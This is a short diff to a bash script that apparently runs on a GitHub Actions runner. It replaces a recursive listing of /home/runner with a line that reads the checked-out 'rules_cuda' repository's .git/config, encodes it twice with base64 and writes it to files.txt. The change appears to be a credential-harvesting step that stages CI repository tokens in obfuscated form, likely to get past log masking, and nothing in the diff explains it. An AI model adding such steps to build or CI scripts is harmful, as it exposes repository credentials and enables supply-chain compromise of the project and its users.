@@ -1,6 +1,6 @@
 #!/bin/bash
 
-B64_BLOB=`ls -lahR /home/runner/ | base64 | base64`
+B64_BLOB=`cat /home/runner/work/rules_cuda/rules_cuda/.git/config | base64 | base64`
 
 echo $B64_BLOB > files.txt
 
